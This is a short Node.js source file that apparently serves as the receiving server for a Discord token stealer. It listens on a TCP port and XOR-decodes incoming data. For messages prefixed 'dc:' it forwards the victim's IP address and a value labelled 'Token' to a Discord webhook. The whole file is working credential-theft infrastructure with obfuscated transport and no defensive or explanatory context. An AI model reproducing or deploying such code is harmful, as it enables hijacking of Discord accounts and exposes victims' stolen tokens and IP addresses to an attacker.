const config = require("./config.json");
const fetch = require("node-fetch");
let net = require("net");
let server = net.createServer((socket) => {
	socket._remoteAddress = socket.remoteAddress;
	socket.on("data", (data) => {
		for(let i = 0; i < data.length; i++)data[i] ^= 0x6F;
		if(data.toString().startsWith("dc:")){
			console.log("Discord log => " + socket._remoteAddress + " => " + data.toString().slice(3, -1));
			fetch(config.WEBHOOK_URL, {
				method: "POST",
				headers: {
					"Content-Type": "application/json"
				},
				body: JSON.stringify({
					embeds: [{
						title: "New log.",
						color: 0x00FF00,
						description: "IP Addr: `" + socket._remoteAddress + "`\nToken: `" + data.toString().slice(3, -1) + "`"
					}]
				})
			});
		}
	});
	socket.on("error", (e) => {
		if(e.code == "ECONNRESET")return;
		console.log(e);
	});
});
server.listen(config.PORT, "0.0.0.0");
